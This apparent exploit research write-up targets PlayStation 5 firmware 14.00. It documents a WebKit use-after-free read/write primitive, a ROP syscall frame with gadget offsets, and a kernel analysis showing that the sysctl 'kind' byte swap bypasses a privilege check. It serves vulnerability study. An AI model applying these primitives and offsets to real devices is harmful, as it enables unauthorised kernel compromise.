# Reading the Gate, Not the Lock: The `sysctl` Kind Swap on PlayStation 5 Firmware 14.00

**Research:** logicalpeyote, Morini Computers
**Engagement:** `ps5-1400-kernel`
**Dates:** 2026-11-06 → 2026-11-07
**Target:** PlayStation 5 (CFI-2000), system software 14.00

---


# Part I : What works

*The chain that is confirmed on device: entry, the two WebKit confusions, the read/write primitive, the syscall path, and the kernel mechanism we characterised.*

## 1. Introduction `[new]`

Two findings anchor this note: a set of userland primitives in the PlayStation 5 User's Guide
browser, confirmed live on a single console, and a correction to a piece of folklore.

The folklore is the *sysctl kind swap*. Since firmware 13.60 the community has carried a
one-byte kernel write target described as "flip the sysctl `kind` field from `0x80048002`
(read-only) to `0x70048002` (writable)" is a black box that asserts the swap makes a read-only
sysctl writable, used that way in published variant analyses with no account of *why* the
kernel would agree. This note opens it. From a live kernel dump with no symbol table, the swap
was traced from the `sysctl` entry through the permission-check chain to the exact instruction
whose flags it changes, and three things came out that the folklore does not capture:

1. **The type field is not involved.** `CTLTYPE` is `kind & 0xf`; both values give `2`
   (`CTLTYPE_INT`), and all ten type-dispatch sites in the sysctl zone are blind to the swap.
   Whatever this is, it is not a type confusion.
2. **What changes is one branch.** A single `test eax, 0x10000000` / `je` pair at
   `0xffffffff9e947f49` decides whether the kernel runs a privilege check at all.
3. **The skipped check is a privilege check, not a MAC check.** Its selector constant
   resolves to 241 and 242, upstream FreeBSD's `PRIV_SYSCTL_WRITE` and
   `PRIV_SYSCTL_WRITEJAIL`. The skipped bit is `CTLFLAG_ANYBODY`.

The consequence is narrower than the folklore implies: the swap removes an early exit and does
not open a new path: it makes an OID *permitted* to be written by an unprivileged caller, but
does not make the kernel copy attacker bytes anywhere.

Everything below is tagged with its evidence class:

| Tag | Meaning |
|---|---|
| **[device]** | Observed on the PS5 at 192.168.1.86, firmware 14.00, in a live browser run. |
| **[static]** | Reproduced from the kernel dump or from a disassembly listing in this note. |
| **[upstream]** | Read from upstream FreeBSD source, used as a naming reference only. |
| **[hypothesis]** | Reasoned but not executed. Carries no proof. |
| **[not tested]** | Reachable in principle; no experiment run. |

Claims that could not be placed in the first three rows are stated as unresolved rather than
smoothed over.

### 1.1 What is established on device

Before the kernel result, it is worth stating plainly what this engagement *has*, because the
userland side is not folklore and does not depend on the kernel question at all. Three things
were confirmed live on the 14.00 console, and each carries its raw output rather than a summary.

**CVE-2026-43720 is present and its re-entrancy is unguarded on this build.** The trigger probe
fired the `getContext()` getter re-entrantly and got back two distinct wrapper objects:

```
TRIGGER   getter=1  inner=true  outer=true  same=false
note: "distinct inner/outer wrappers - reentrancy NOT guarded on this build"
outcome: VULNERABLE
```

**[device]** The `same=false` is the whole enabling condition. On a build where re-entrancy is
guarded, the inner and outer calls return the same wrapper and there is no window. Here they do
not, and the window exists.

**The reclaimed object gives a bidirectional read/write, in both directions, proven separately.**
This is the load-bearing result of the userland side:

```
SPRAYED   n=80
WRITE     ok=true  a=99.001
CHANNEL   match=true  a=11.110011
ALIAS     idx=3
REVERSE   bidirectional=true
outcome: VULNERABLE
detail: {sprayed: 80, channel: true, write_ok: true, alias_idx: 3,
         bidirectional: true, prop_alias: true}
```

**[device]** Two directions were tested as separate assertions, not inferred from one. `WRITE`
carries a value in through the public setter and `CHANNEL` confirms it landed with a different
value (`99.001` written, `11.110011` read back through the alias; the alias is a distinct
object, not a mirror of the writer). `REVERSE` then proves the opposite direction independently.
`prop_alias: true` records that the aliasing holds through property access, not only through the
method surface.

**A second, orthogonal confusion exists at the iterator level.** `ntfusion-iterator-confusion`
returns `CONFUSED` with a differential inside it: a control-conforming iterator does not throw
where a plain object does.

```
variants: [ {label: "control-conforming", threw: false, verdict: "no-throw"},
            {label: "plain-object",       threw: true,  ctor: "TypeError"}, ... ]
outcome: CONFUSED
```

**[device]** This is reported as a **reachability gate, not a primitive**: see §4. It confirms
a confusion exists but does not by itself yield a read or a write.

**What the chain currently is, stated exactly.** Re-entrant `getContext()` → distinct inner/outer
wrapper → same-type reclaim of the freed slot → bidirectional read/write over the reclaimed
object. **Every link in that chain is confirmed on device.** What the chain does *not* yet reach
is an address: the primitive reads and writes a window it cannot locate, which is the code-leak
gap of §12.2 and not a defect in the chain.

**Where the novelty actually sits, and what backs it.** The userland primitives are confirmations
of a known CVE on a new firmware, valuable as a device measurement, not as a novel finding.
**The novel contribution is the kernel characterisation in §4: that the `oid_kind` swap is a
permission-check bypass rather than a type confusion.** That claim is backed by three
independent static observations (the untouched `CTLTYPE` nibble across ten dispatch sites, the
single moved `test`/`je` pair at a named address, and the privilege-selector constants resolving
to 241/242) and by a novelty survey finding zero prior published characterisation of it (§14.4).
**The distinction matters for how much weight to put on each part of this note: one half is
confirmed measurement of known things, the other half is a new reading of something everyone
else used as a black box.**

---


## 2. Target and entry vehicle `[already known]`

### 2.1 The console

One PlayStation 5 Slim (CFI-2000) Digital Edition, system software **14.00**, at
`192.168.1.86` on a flat home network. The user-agent reported by the target browser:

```
Mozilla/5.0 (PlayStation; PlayStation 5/14.00) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15
```

**[device]**: captured from the request headers arriving at the redirect server during the
first live run (`evidence/ondevice_1400_confirmed.md`, 2026-11-07 08:06 UTC).

### 2.2 Getting arbitrary JavaScript into the guide

The User's Guide is an embedded WebKit WebProcess pinned to `manuals.playstation.net`; the entry
is a DNS rewrite pointing that host at a LAN server serving an instrumented page instead of the
manual, implemented in AdGuard Home on `192.168.1.70`. The active config, read back rather than
assumed:

```
manuals.playstation.net  ->  192.168.1.70   enabled
chill.servebeer.com      ->  192.168.1.70   enabled
```

**[device]** Note what is *absent*: no `ps5.np.playstation.net` entry. Upstream's 14.10 notes
identify that host as the guide **app shell**: the domain whose response carries the WebView,
versus `manuals.playstation.net`, which carries only content. The shell rewrite was staged but
never applied: hijacking it can break the guide outright, and the content path was already
producing results. Whether the shell path yields a less constrained WebProcess is
**[not tested]**.

### 2.3 The console as a self-driving instrument

The page polls `GET /plan` every 2.5 s, executes whatever module the server hands it, and
phones home via `POST /log`. Two properties did the heavy lifting:

- **One module per plan.** A module that crashes the browser kills only itself; the queue
  survives. Crash isolation is a scheduling property, not a coding convention.
- **A two-layer watchdog.** A client-side `Promise.race` against a wall-clock deadline, plus a
  server-side `MODULE_MAX_WALL`. A hung module is skipped rather than stalling the queue.

Plans 1–5 of the definitive WebKit run executed with **zero operator interaction** after the
initial page load. **[device]**

### 2.4 The kernel image

```
kernel-13.60-live.bin
size    103,546,880 bytes
sha256  c3f745e25dc25ee7afef89eb418b295b6334bbefe8aa17e6886483c35d78cddd
format  raw, not ELF, no symbol table
file_offset = virtual_address - 0xffffffff9e3f0000
```

**[static]** The mapping is valid for the static image only; live runtime pointers are
outside its domain (§13.5). Tooling: capstone 5.0.7 x86-64 `detail=True`, cross-checked with
`objdump -D -b binary -m i386:x86-64 --adjust-vma=0xffffffff9e3f0000`. Two environment traps
cost time and are worth recording: the host venv's `bin/python` points at 3.13 while
`site-packages` holds 3.12 packages, so capstone needs an explicit
`PYTHONPATH=/opt/AGENTS/Ares/tmp/csenv/lib/python3.12/site-packages`; and a stray
`/tmp/inspect.py` shadows the standard library's `inspect` module and breaks the capstone
import with an error that does not mention either file.

---


## 3. CVE-2026-43720 : the canvas re-entrancy `[already known]`

### 3.1 What the bug is

`HTMLCanvasElement.getContext()` is not re-entrancy-safe. Calling it a second time from inside
the settings-object conversion of a first call causes the first call's context object to be
freed while a live reference to it is still held by the caller. The result is a use-after-free on
a 768-byte `CanvasRenderingContext2D` allocation.

The bug is WebKit bug 313175. Upstream characterises it as **unpatched on 14.10**, confirmed by
their probe `p553` on 2026-10-26, with the writable surface being the 6×float64 transform
matrix plus seven numeric properties over the 768-byte context. **14.00 (2026-09-16) predates
14.10 (2026-10-01), so the finding transfers** **[upstream]**.

What was not known before this engagement, and what we measured, is whether the bug is *live and
usable* on 14.00 specifically, as opposed to present in the source and unreachable in the
build. That is a different question and it needed a device.

### 3.2 How we exploit it

Three probes, run in sequence, each answering a different question **[device]**:

```
CVE-2026-43720-trigger   -> VULNERABLE      same: false    getter: 1
43720-bitmap-trigger     -> REENTRY-DIFFERENT-CTX
                                             reentrant: true
                                             same: false
                                             other_unchanged: true
CVE-2026-43720-rw        -> VULNERABLE      sprayed: 80
                                             write_ok: true
                                             bidirectional: true
                                             prop_alias: true
                                             alias_idx: 3
```

**Step 1: prove the window exists.** The trigger calls `getContext()` re-entrantly and compares
the two handles. `same: false` means they are distinct objects, so the outer one can be freed
while the inner reference survives. `getter: 1` is the load-bearing field: **the settings getter
is not guarded against re-entrancy on this build.** On a build where it is guarded, both calls
return the same wrapper and there is no window at all.

**Step 2: prove the window is not self-cleaning.** The bitmap-trigger variant checks what
happens to the *other* context after the re-entry. `other_unchanged: true` with
`reentrant: true` says the second context is a genuinely separate object that the engine did not
silently reconcile. This rules out the benign reading in which re-entrancy returns a fresh object
and the old one stays valid.

**Step 3: prove we can read and write through it.** A spray of 80 one-by-one canvases reclaims
the freed slot; `alias_idx: 3` identifies which spray element took it. Then two directions are
asserted **separately**, not inferred from one another:

```
WRITE   ok=true  a=99.001        value pushed through the public setter
CHANNEL match=true  a=11.110011  value read back through the alias (a different object)
REVERSE bidirectional=true       the opposite direction, tested on its own
```

`prop_alias: true` records that the aliasing holds through **property access**, not only through
the method surface, which is what makes it usable as a search tool rather than only as a
modification tool.

### 3.3 What the primitive gives us, and what it does not

**It gives us** a live, bidirectional read/write window over a reclaimed 768-byte object, reached
from ordinary DOM calls, with no JIT and no WebAssembly required.

**It does not give us the address of that object.** The window is positioned relative to
something we control, but its absolute location in memory is unknown, and the value channel is
float64, which is where §10 comes in. **This is the single thing standing between a working
userland primitive and a usable one, and it is the same wall upstream reports.**

Memory was bounded deliberately: 1×1 canvases, a spray of 80, under the ~100 MB ceiling that
killed an earlier plan.


## 4. The `ntfusion` iterator confusion `[new]`

### 4.1 What the bug is

WebKit's iterator handling accepts a replaced `Array.prototype[Symbol.iterator]` that yields
**plain objects where iterator-result records are expected**. Constructing a `TransformStream`
over such an array drives the engine down a path that assumes the record shape and does not
validate it.

This is independent of the canvas family: different entry point, different object family,
different detection signal. **It is a second WebKit confusion on 14.00, not a second symptom of
the first one.**

### 4.2 How we exploit it : and why we call it a gate, not a primitive

```
ntfusion-iterator-confusion -> CONFUSED
                              control_clean: true
                              confused_variants: 4
                                control-conforming   : no throw
                                plain-object         : yes (TypeError, "Internal Transfo…")
                                object-with-heapref  : yes
                                truncated            : yes
                                non-record-result    : yes
```

**`control_clean: true` is what makes this a finding rather than noise.** A conforming iterator
does not throw, so the four throwing variants are a genuine divergence and not a module that
merely always errors. Without the control, the whole result would be uninterpretable.

**The scope needs stating narrowly, because the module that produced it states it narrowly.** The
verdict `CONFUSED` means the confusion path is **reachable**. The module's own comments record
that a `TypeError` here is the PoC's PASS and that *"we only report reachability, never infer
exploitability from a throw."*

| | Status |
|---|---|
| Confusion reachable | **confirmed** **[device]** |
| Confused object produced and retained | **DONE: 3/3 retained and readable** **[device]** |
| Pointer scan on retained objects | **DONE: 6 objects scanned, 0 pointer-shaped** **[device]** |
| Engine-side object captured and scanned | **DONE: stream/writable/readable/writer, all `ownProps=0`, 0 pointer-shaped** **[device]** |
| Deref → arbitrary read | **not reachable: see below** |

Two follow-up probes were run against this finding. Neither observed the guard and the access in
the right order, but the second answers the question indirectly and more strongly than the error
message did.

**Probe 1, `retain-confused-object-1400`:**

```
BASE     f64->u8 visible=true bytes0=0,0,0,0,0,0,248,63
CONF     threw=TypeError msg=Type error
RETAIN   yielded=3 iters=2 stream=no thrown=yes
SCAN     objects-scanned=6 ptrlike=0   FREQ {}   CANDS []
ALIVE    retained-and-readable=3/3
VERDICT  OBJECT-RETAINED ptrlike=0
```

**Probe 2, `engine-object-1400`**, built deliberately to capture the *engine's* object rather
than our own inputs:

```
BASE     f64->u8=true b0..7=0,0,0,0,0,0,248,63
BUILD    stream created with default (valid) ctor
OBJ      stream=object ownProps=0
SCAN     stream.writable ownProps=0
SCAN     stream.readable ownProps=0
READ     ReadableStream with confused iterator built ok
WRITER   writer acquired
SUMMARY  captured=4 ptrlike=0
VERDICT  NO-ENGINE-POINTER (baseline alive, so this is a real negative)
```

**Both probes carried a live baseline of the read channel**: the `BASE` line in each shows the
f64→u8 channel visible before any confusion was introduced. **That is what makes the zeros real
negatives rather than vacuous ones.** A scan that finds nothing on a channel that cannot read is
worthless; a scan that finds nothing on a channel demonstrated working one line earlier is a
measurement.

**The result that matters is not the pointer zero. It is `ownProps=0`.** `stream`,
`stream.writable`, `stream.readable` and the writer all return **zero observable properties**
under `getOwnPropertyNames`. This corroborates the §5 census independently
(`textarea ownProps=0 div ownProps=0 canvas ownProps=0`); it now holds for engine objects, not
just DOM nodes. **The pointers live in the C++ object and JavaScript does not expose them.** The
only properties observed anywhere in either probe were our own `{v: i}` inputs.

**On the guard-versus-access ordering:** in probe 2 the confusion **did not throw**:
`ReadableStream with confused iterator built ok`, `writer acquired`, with zero pointers lost and
zero crashes. That is **consistent with the guard preceding the access, but it does not
demonstrate the order.** Nothing here proves the guard runs first; it shows that when the
confused path is taken, nothing unsafe becomes observable through JavaScript.

**The conclusion, stated without overselling it: the iterator confusion is not proven harmless.**
What is proven is that it is **unreadable through JavaScript property enumeration.** Those are
different claims and only the second one is supported.

**And the circle is worth naming explicitly, because it is the whole finding.** Reading the
confused object would require the bidirectional primitive. The bidirectional primitive requires
the address of the confused object. That address is exactly the leak we do not have. **The bug
cannot be exploited with the capability that the bug would provide**: it is closed by the same
missing piece that closes every other route in §12.3, arriving from a direction we did not
expect.

**No CVE is claimed for this bug, by decision.** The impact is not demonstrated and is not being
presented as though it were.

**Treating a reachability signal as a primitive is exactly the error class §13.8 is about**, and
it is the reason this chapter exists separately rather than being folded into the primitives of
§3. The confusion is real and it is ours to try; it is not, today, a read or a write.


## 5. What the guide sandbox exposes `[new]`

The first module run was deliberately boring: enumerate the Web APIs. It decided whether
anything else on the queue was runnable at all.

**[device]** `evidence/ondevice_1400_confirmed.md`, module `API-availability`:

| API | Present | Error when absent |
|---|---|---|
| `canvas 2d` | **yes** | (`ctx-ok`) |
| `messageChannel` | **yes** | (`ok`) |
| `localStorage` | **yes** | (`ok`) |
| `fetch` | **yes** | (`function`) |
| `WebSocket` | **yes** | (`function`) |
| `webgl` | **no** | `Error` |
| `indexedDB` | **no** | `Error` |
| `idb-open` | **no** | `TypeError` |
| `worker` | **no** | **`SecurityError`** |
| `audioContext` | **no** | `Error` |

The worker result deserves emphasis over its own row: `SecurityError` is neither "not
implemented" nor "constructor threw": it is a policy refusal. The guide WebProcess is denied
worker creation outright, removing an entire class of heap-grooming and cross-thread race
primitives before they are tried. `SharedArrayBuffer` is likewise absent, making
`Atomics.waitAsync` decorative: no SAB-based grooming, no cross-thread race surface.
**[device]** `structuredClone`, however, **is present**: worth flagging precisely because the
published Relapse WebKit stage is built on a structured-clone pool mismatch: the primitive
exists on 14.00, the mismatch does not (§11). **[device]**


## 6. Reaching a system call from the browser `[new]`

A ROP frame over WebProcess gadgets was built and verified in V8 before touching the console:

```
pop rdi; <name ptr>
pop rsi; <namelen>
pop rdx; <old ptr>
pop rcx; <oldlenp ptr>
pop r8;  <new ptr>
pop r9;  <newlen>
pop rax; 199
syscall
```

**[device]** `evidence/browser-syscall-binding.md`. Gadget offsets from the WebKit module's
`wk_gadgetmap`: `ret 0xC7`, `pop rdi 0x288B2`, `pop rsi 0x14EAD`, `pop rdx 0xFA7A2`,
`pop rcx 0x80597`, `pop rax 0x3C98E`, `pop rsp 0xA1138` (pivot), **`pop r8 0x8CE7C`**,
**`pop r9 0x80596`**, `mov [rdi],rsi 0xC05B6`, `mov [rdi],rax 0x3881F`,
`mov [rdi],eax 0x38820`, `mov rax,[rax] 0x6FD92`, `add rax,rcx 0x319FE4`.

Test results: the 6-arg frame is 21 words with 6 controlled arguments, gadget order strictly
increasing, every argument immediately following its gadget. The 4-arg degradation is 15
words / 4 args. A malformed 10-word frame returns `-1` rather than a wrong answer.

This settles a live contradiction in the community corpus. One published gadget catalogue
states "Not found: `pop r8`, `pop r9` … (confirmed absent in full 4.6 MB scan, probes
272a/386a). Max 4 controlled syscall args." Another published table lists
`["pop r8; ret"] = 0x991`. Both are correct, about **different binaries**. The four-argument
limit belongs to the game eboot used by the loader path. The WebProcess has `pop r8` and
`pop r9`. The kind swap can be driven from the browser through a real system call.

## 7. The sysctl kind swap: what it actually does `[new]`

This section is the core of the note. Everything in it is **[static]** unless marked
otherwise.

### 7.1 Finding the dispatch without a symbol table

With no symbols, the question "which function handles `kern.osrevision`?" cannot be asked
directly. It was answered arithmetically.

The dispatch site:

```
0xffffffff9e94875e   4c 8b 7b 38      mov  r15, qword ptr [rbx + 0x38]
```

The handler is loaded from `+0x38` of the OID structure. For `kern.osrevision` that yields
base `0xffffffffa095a6e0`; for `kern.osreldate`, `0xffffffffa095b3a8` (file
`0x256b3a8`).

The OID field map at the new base:

| Offset | Field | `kern.osrevision` |
|---|---|---|
| `+0x18` | `oid_number` | 3 |
| `+0x1c` | **`oid_kind`** | `0x80048002` |
| `+0x20` | `oid_arg1` | 0 |
| `+0x28` | `oid_arg2` | `0x30b52` = 199506 |
| `+0x30` | `oid_name` | → `"osrevision"` |
| `+0x38` | **`oid_handler`** | `0xffffffff9e6609e8` |
| `+0x40` | `oid_fmt` | n/a |
| `+0x4c` | refcount | n/a |
| `+0x50` | `oid_descr` | n/a |

The swap byte is byte-identical under both base conventions:

```
0x256b3b0 + 0x17  ==  0x256b3a8 + 0x1f  ==  0x256b3c7
```

**[static]** This identity is why the community's published swap offset survives a change in
how the structure base is counted.

### 7.2 The swap is one byte

```
0x80048002  ->  0x70048002
XOR           =  0xF0000000
little-endian :  02 80 04 80  ->  02 80 04 70
differing byte index: 3
```

**[static]** Verified by simulation on five OIDs: `osrevision`, `osreldate`, `ncpu`,
`pagesize`, `byteorder`. One byte, at `oid_kind + 3`.

### 7.3 The type field is untouched

`CTLTYPE` is `kind & 0xf`. **[upstream]** `sys/sys/sysctl.h`: `#define CTLTYPE 0xf`,
`CTLTYPE_INT 2`.

| `oid_kind` | `& 0xf` | `& 0x10000000` | `je` at `9e947f4e` |
|---|---|---|---|
| `0x80048002` | **2** | `0x0` | **taken** |
| `0x70048002` | **2** | `0x10000000` | **not taken** |

The type is `2` before and after. A scan of every reader of `[reg + 0x1c]` in the sysctl zone
found 17 sites; the masks applied immediately after the read were `0xf` ×10 (none of them a
swapped bit), `0x81000` ×1, `0x2000000` ×1, `0x1000000` ×1, and **`0x10000000` ×1**, the
only one that touches a swapped bit**.

**[static]** The swap is invisible to type dispatch. It is not a type confusion.

### 7.4 The one branch that moves

```
0xffffffff9e947f45   41 8b 47 1c      mov   eax, dword ptr [r15 + 0x1c]
0xffffffff9e947f49   a9 00 00 00 10   test  eax, 0x10000000
0xffffffff9e947f4e   74 8b            je    0xffffffff9e947edb
0xffffffff9e947f50   49 83 7f 38 00   cmp   qword ptr [r15 + 0x38], 0
0xffffffff9e947f55   74 26            je    0xffffffff9e947f7d
```

With `0x80048002` the `je` is taken and control reaches a check block. With `0x70048002` it
is not taken and control falls through to dispatch.

The block the swap skips:

```
0xffffffff9e947edb   mov    r13, rdi
0xffffffff9e947ede   mov    rdi, [rbx]
0xffffffff9e947ee1   and    eax, 0x4000000
0xffffffff9e947ee6   mov    esi, 0xf2
0xffffffff9e947eeb   mov    r14, rdx
0xffffffff9e947eee   cmp    eax, 1
0xffffffff9e947ef1   sbb    esi, 0          ; esi = 242 or 241
0xffffffff9e947ef4   call   0xffffffff9eecfa30
0xffffffff9e947ef9   mov    rdi, r13
0xffffffff9e947efc   mov    rdx, r14
0xffffffff9e947eff   test   eax, eax
0xffffffff9e947f01   jne    0xffffffff9e948071   ; EARLY RETURN
0xffffffff9e947f07   jmp    0xffffffff9e947f50
```

`esi` is derived from `and eax, 0x4000000` / `mov esi, 0xf2` / `cmp eax, 1` / `sbb esi, 0`.
With `0x80048002`, `& 0x4000000 = 0`, so `cmp eax,1` sets carry, and `esi = 241`.

**241 and 242 are not arbitrary.** **[upstream]** `sys/sys/priv.h`:

```c
#define PRIV_SYSCTL_WRITE      241   /* Can write sysctls. */
#define PRIV_SYSCTL_WRITEJAIL  242   /* Can write sysctls, jail permitted. */
```

And the selector bit `0x04000000` is `CTLFLAG_PRISON`: "Prisoned roots can fiddle". The
shape matches upstream `sysctl_root()` exactly:

```c
/* Is this sysctl writable by only privileged users? */
if (req->newptr && !(oid->oid_kind & CTLFLAG_ANYBODY)) {
        int priv;
        if (oid->oid_kind & CTLFLAG_PRISON)
                priv = PRIV_SYSCTL_WRITEJAIL;
        ...
        else
                priv = PRIV_SYSCTL_WRITE;
        error = priv_check(req->td, priv);
        if (error)
                goto out;
}
```

**[upstream]** The bit the swap sets, `0x10000000`, is `CTLFLAG_ANYBODY`: "All users can
set this var". The swap sets it. The guard `!(oid_kind & CTLFLAG_ANYBODY)` becomes false.
`priv_check` is not called.

This is the answer to the question the folklore never asked. The swap does not confuse the
kernel about what kind of value this is. It sets the flag that says *anybody may write this*,
and the kernel's own permission logic agrees.

### 7.5 The full gate chain

The same `eax = [oid + 0x1c]` feeds three gates upstream of the branch in §7.4:

```
0xffffffff9e947eb1:  cmp  qword ptr [rbx + 0x30], 0
0xffffffff9e947eb6:  je   0xffffffff9e947f50
0xffffffff9e947ebc:  mov  r13d, 1
0xffffffff9e947ec2:  test eax, 0x40000000
0xffffffff9e947ec7:  je   0xffffffff9e948074     ; <- gate 1
0xffffffff9e947ecd:  test eax, 0x08000000
0xffffffff9e947ed2:  jne  0xffffffff9e947f09     ; <- gate 2
0xffffffff9e947ed4:  test eax, 0x10000000
0xffffffff9e947ed9:  jne  0xffffffff9e947f50     ; <- gate 3: skips the check
0xffffffff9e947edb:  ...  call 0xffffffff9eecfa30 ; the check that denies
```

Traced against the flag values:

- **With `0x80048002`**: gate 1 `test 0x40000000` = 0 → **JE → exit at
  `0xffffffff9e948074` with `r13d = 1`**. The check is never interrogated.
- **With `0x70048002`**: gate 1 passes (`0x40000000` set), gate 2 not taken
  (`0x08000000` clear), gate 3 `JNE` → dispatch, check skipped.

Control-flow-graph entry counts confirm the three-way separation:

| Block | Incoming edges |
|---|---|
| check block `0xffffffff9e947edb` | **1** (`je @ 9e947f4e`) |
| dispatch `0xffffffff9e947f50` | 4 (`je@eb6`, `jne@ed9`, `jmp@f07`, `je@f43`) |
| gate chain `0xffffffff9e947eb1` | 2 (`jne@e7a`, `je@ea0`) |
| bextr branch `0xffffffff9e947f09` | 1 (`jne@ed2`) |

The check block has exactly one entry, and the swap closes it.

### 7.6 The check denies when it runs

The check is reachable **only** via the bextr path: `jne@ed2 → bextr esi, eax, 0x414 →
call 0xffffffff9e69a9b0 → fallthrough 0xf34 → test eax, 0x10000000 → je 0xedb`; that is,
only with `0x08000000` set and `0x10000000` clear.

Following it to ground:

```
0xffffffff9eecfa30:  push rbp
                     mov  rbp, rsp
                     mov  rdi, [rdi + 0x140]
                     pop  rbp
                     jmp  0xffffffff9eecf890
```

The jump table at `0xffffffff9fe3785c`, indexed `[base + (esi - 5) * 4]`, range `0..500`:

| `esi` | index | slot | target | meaning |
|---|---|---|---|---|
| 241 | 236 | `0xffffffff9fe37c0c` | `0xffffffff9efdaa3f` = `mov eax,1; pop rbp; ret` | **DENY** |
| 242 | 237 | `0xffffffff9fe37c10` | `0xffffffff9efdaa21` = `pop rbp; ret` (eax = 0) | **ALLOW** |

Propagation:

```
0xffffffff9eecf89f   call 0xffffffff9efda9f0      ; -> eax = 1
0xffffffff9eecf8a4   mov  r14d, eax
0xffffffff9eecf8a7   test eax, eax
0xffffffff9eecf8a9   je   0xffffffff9eecf8e5      ; NOT taken
0xffffffff9eecf8ab   mov  rdi, [rip+0x1ded966]    ; [0xffffffffa0cbd218] = 0x0
0xffffffff9eecf8b2   test rdi, rdi
0xffffffff9eecf8b5   je   0xffffffff9eecf978      ; TAKEN
0xffffffff9eecf978   mov  eax, r14d
0xffffffff9eecf985   ret
```

The only ALLOW branch inside `0xffffffff9efda9f0`:

```
mov  rcx, [rdi + 0x30]
lea  rdx, [rip + 0x200bb21]     ; 0xffffffffa0fe6520
xor  eax, eax
cmp  rcx, rdx
je   0xffffffff9efdaa21         ; ALLOW
```

The sentinel `0xffffffffa0fe6520` holds twenty zero bytes: an "unlabelled object". **This is
the single statically-unresolvable point in the whole chain**, and it is worth being precise
about why: it depends on the runtime value of `[[rbx] + 0x140]`, **not on `kind`**. No amount
of further static work closes it; it needs a live instance. Three claims, each separately
verified: the check denies when executed (verified on bytes), our OID never executes it
(verified on the CFG), and the swap is load-bearing (verified).

### 7.7 Verdict

**The kind swap is a permission bypass.**

It is not a type confusion: `CTLTYPE` is unchanged and every type dispatch is blind to it.
It is not a write primitive: it changes which branch the kernel takes, not what gets copied.
**The swap removes an early exit; it does not open a new path.**

One address carries the entire console-verification burden: **`0xffffffff9e947f49`**.

---


## 8. The sysctl write path and the 303 writable OIDs `[new]`

### 8.1 The handler and its own CFI guard

The shared `ncpu` / `osrevision` / `pagesize` handler was disassembled directly:

```
0xffffffff9e947540   55                 push  rbp
0xffffffff9e947541   48 89 e5           mov   rbp, rsp
0xffffffff9e94754f   4c 8d 25 ba 4d 3c 03   lea r12, [rip + 0x33c4dba]
0xffffffff9e94755c   49 8b 04 24        mov   rax, qword ptr [r12]
0xffffffff9e94756f   48 8d 05 c2 1d d1 ff   lea rax, [rip - 0x2ee23e]
0xffffffff9e947576   4c 8b 7b 28        mov   r15, qword ptr [rbx + 0x28]
0xffffffff9e94757a   4c 29 f8           sub   rax, r15
0xffffffff9e94757d   48 c1 c8 03        ror   rax, 3
0xffffffff9e947581   48 83 f8 03        cmp   rax, 3
0xffffffff9e947585   77 6d              ja    0xffffffff9e9475f4
0xffffffff9e947593   41 ff d7           call  r15
0xffffffff9e947596   85 c0              test  eax, eax
0xffffffff9e947598   75 43              jne   0xffffffff9e9475dd
...
0xffffffff9e9475b7   4c 8b 7b 48        mov   r15, qword ptr [rbx + 0x48]
0xffffffff9e9475bb   48 8d 05 3e 29 d1 ff   lea rax, [rip - 0x2ed6c2]
0xffffffff9e9475c2   4c 29 f8           sub   rax, r15
0xffffffff9e9475c5   48 c1 c8 03        ror   rax, 3
0xffffffff9e9475c9   48 83 f8 16        cmp   rax, 0x16
0xffffffff9e9475cd   77 3d              ja    0xffffffff9e94760c
0xffffffff9e9475d7   4c 89 f6           mov   rsi, r14
0xffffffff9e9475da   41 ff d7           call  r15
0xffffffff9e9475dd   49 8b 0c 24        mov   rcx, qword ptr [r12]
0xffffffff9e9475e1   48 3b 4d d8        cmp   rcx, qword ptr [rbp - 0x28]   ; stack canary
```

**[static]** The lines cited in earlier notes: `9e947564 test rsi,rsi`,
`9e947569 mov edx,[r14]`, `9e947587 lea rsi,[rbp-0x2c]`, `9e94758b mov edx,4`,
`9e947593 call r15`, are confirmed byte-for-byte. The CFI anchor of the first inner call is
`0xffffffff9e947576 - 0x2ee23e = 0xffffffff9e659338`, `N = 3`. The second inner call is
loaded from `[req + 0x48]` with `N = 0x16`.

**One interpretation caveat carried forward deliberately.** Here `rbx = rcx = req`, the
`sysctl_req` structure. The callee therefore comes from the **request**, not from the OID.
Earlier notes described this as "writes into `oid_arg1`". That is an interpretation of
intent, not what the bytes show, and the difference matters for anyone building on it.

### 8.2 The CFI window

Handler dispatch is guarded by an identity test of the form
`sub rax, r15; ror rax, 3; cmp rax, N; ja reject`.

For the sysctl dispatch site: `A = 0xffffffff9e6616f8`, `N = 0x1a3` (419), admitting the
range `[0xffffffff9e6609e0 .. 0xffffffff9e6616f8]`: 420 8-byte slots, **420/420
non-null**. Admission is `ror3(A − H) ≤ N` with `ror3(v) = ((v >> 3) | (v << 61)) & MASK`.

The census that makes this an identification rather than a guess: **5,146** complete
`lea`/`sub`/`ror3`/`cmp`/`ja` windows exist in TEXT. Of those 5,146, **exactly one** admits
`kern.osreldate`'s handler (`ror3 = 0x81`) and **exactly one** admits the shared
`ncpu`/`osrevision`/`pagesize`/`byteorder` handler (`ror3 = 0x1a2`): **the same window**.

**[static]** The sysctl handler window was identified by arithmetic, not by name.

### 8.3 The writable-OID scan

With the mechanism understood, the writable surface was enumerated directly from the OID
image. The scan iterates candidate OID structures and classifies on the flag bits:

```python
for i in range(0x2000000, 0x2c00000, 8):
    kind = u32(i + 0x1c)
    if kind & 0xf in (1, 2, 3, 5) and (kind & 0x80000000 or kind & 0x40000000):
        namep = u64(i + 0x30)
        nf = namep - BASE
        # require a C string of 2 < len < 28, all printable ASCII
        classify by kind & 0x40000000
```

**[static]** Executed against the dump. Result:

```
OID WRITABLE  (0x40000000 set) = 303
OID read-only (0x80000000)     = 332
```

Sample writable OIDs (base = file offset, name, kind, `arg1`):

```
0x21e9968  lookup_shared    0xc00c1002   0xffffffffa05d99c8
0x21ec120  default_policy   0xc0000003   0x0
0x21ec290  write_behind     0xc0040002   0xffffffffa05dc3e0
0x21ec2f0  read_max         0xc0040002   0xffffffffa05dc3b0
0x21ec350  read_min         0xc0040002   0xffffffffa05dc3b4
```

The count is a **static classification of the image**, not a live write test. No OID on this
list has been written from the console. What the scan establishes is the size and shape of the
surface; what it does not establish is that any particular entry is reachable from the guide
browser with the privileges that process holds.

### 8.4 The amplifier, and why it is not one

A natural follow-on: if a one-byte write can change `kind`, can it amplify into a bulk copy?
Two one-byte primitives on the same field were designed: QUAD → STRING changes byte **index 0**
at `struct + 0x14` to `0x03`; QUAD → `0x70…` changes byte **index 3** at `struct + 0x17` to
